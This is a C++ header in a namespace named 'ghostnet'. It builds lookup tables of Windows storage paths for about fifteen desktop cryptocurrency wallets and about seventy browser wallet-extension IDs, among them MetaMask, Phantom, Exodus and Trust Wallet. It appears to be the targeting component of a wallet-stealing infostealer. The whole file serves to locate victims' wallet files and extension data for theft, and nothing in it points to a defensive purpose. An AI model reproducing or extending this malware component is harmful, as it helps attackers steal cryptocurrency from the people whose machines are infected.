#pragma once

#include <string>
#include <map>

namespace ghostnet {

inline std::map<std::string, std::string> buildWalletPaths(const std::string& appData, const std::string& localAppData) {
    return {
        {"Armory", appData + "\\Armory"},
        {"Atomic", appData + "\\Atomic\\Local Storage\\leveldb"},
        {"Bitcoin", appData + "\\Bitcoin\\wallets"},
        {"Bytecoin", appData + "\\bytecoin"},
        {"Coinomi", localAppData + "\\Coinomi\\Coinomi\\wallets"},
        {"Dash", appData + "\\DashCore\\wallets"},
        {"Electrum", appData + "\\Electrum\\wallets"},
        {"Ethereum", appData + "\\Ethereum\\keystore"},
        {"Exodus", appData + "\\Exodus\\exodus.wallet"},
        {"Guarda", appData + "\\Guarda\\Local Storage\\leveldb"},
        {"Jaxx", appData + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"},
        {"Litecoin", appData + "\\Litecoin\\wallets"},
        {"MyMonero", appData + "\\MyMonero"},
        {"Monero", appData + "\\Monero"},
        {"Zcash", appData + "\\Zcash"}
    };
}

inline std::map<std::string, std::string> buildExtensionIds() {
    return {
        {"dlcobpjiigpikoobohmabehhmhfoodbb", "Argent X"},
        {"jiidiaalihmmhddjgbnbgdfflelocpak", "BitKeep Wallet"},
        {"bopcbmipnjdcdfflfgjdgdjejmgpoaab", "BlockWallet"},
        {"odbfpeeihdkbihmopkbjmoonfanlbfcl", "Coinbase"},
        {"hifafgmccdpekplomjjkcfgodnhcellj", "Crypto.com"},
        {"kkpllkodjeloidieedojogacfhpaihoh", "Enkrypt"},
        {"mcbigmjiafegjnnogedioegffbooigli", "Ethos Sui"},
        {"aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"},
        {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"},
        {"afbcbjpbpfadlkmhmclhkeeodmamcflc", "MathWallet"},
        {"mcohilncbfahbmgdjkbpemcciiolgcge", "OKX"},
        {"jnmbobjmhlngoefaiojfljckilhhlhcj", "OneKey"},
        {"fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"},
        {"lgmpcpglpngdoalbgeoldeajfclnhafa", "SafePal"},
        {"mfgccjchihfkkindfppnaooecgfneiii", "TokenPocket"},
        {"nphplpgoakhhjchkkhmiggakijnkhfnd", "Ton"},
        {"amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"},
        {"heamnjbnflcikcggoiplibfommfbkjpj", "Zeal"},
        {"jagohholfbnaombfgmademhogekljklp", "Binance Smart Chain"},
        {"bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"},
        {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance"},
        {"fihkakfobkmkjojpchpfgcmhfjnmnfpi", "Bitapp"},
        {"aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"},
        {"aeachknmefphepccionboohckonoeemg", "Coin98"},
        {"hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"},
        {"agoakfejjabomempkjlepdflaleeobhb", "Core"},
        {"pnlfjmlcjdjgkddecgincndfgegkecke", "Crocobit"},
        {"blnieiiffboillknjnepogjhkgnoapac", "Equal"},
        {"cgeeodpfagjceefieflmdfphplkenlfk", "Ever"},
        {"ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"},
        {"cjmkndjhnagcfbpiemnkdpomccnjblmj", "Finnie"},
        {"nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"},
        {"fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"},
        {"flpiciilemghbmfalicajoolhkkenfel", "Iconex"},
        {"cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"},
        {"jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"},
        {"pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"},
        {"dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"},
        {"kpfopkelmapcoipemfendmdcghnegimn", "Liquality"},
        {"nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"},
        {"dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"},
        {"efbglgofoippbgcjepnhiblaibcnclgk", "Martian"},
        {"nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"},
        {"ejbalbakoplchlghecdalmeeeajnimhm", "Metamask2"},
        {"fcckkdbjnoikooededlapcalpionmalo", "Mobox"},
        {"lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"},
        {"jbdaocneiiinmjbjlgalhcelgbejmnid", "Nifty"},
        {"fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"},
        {"mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"},
        {"ejjladinnckdgjemekebdpeokbikhfci", "Petra"},
        {"bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"},
        {"phkbamefinggmakgklpkljjmgibohnba", "Pontem"},
        {"nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"},
        {"pocmplpaccanhmnllbbkpgfliimjljgo", "Slope"},
        {"bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"},
        {"fhmfendgdocmcbmfikdcogofphimnkno", "Sollet"},
        {"mfhbebgoclkghebffdldpobeajmbecfk", "Starcoin"},
        {"cmndjbecilbocjfkibfbifhngkdmjgog", "Swash"},
        {"ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"},
        {"aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"},
        {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"},
        {"egjidjbpglichdcondbcbdnbeeppgdph", "Trust Wallet"},
        {"hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"},
        {"eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"},
        {"bocpokimicclpaiekenaeelehdjllofo", "XinPay"},
        {"ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"},
        {"kncchdigobghenbbaddojjnnaogfppfj", "iWallet"},
        {"epapihdplajcdnnkdeiahlgigofloibg", "Sender"}
    };
}

}


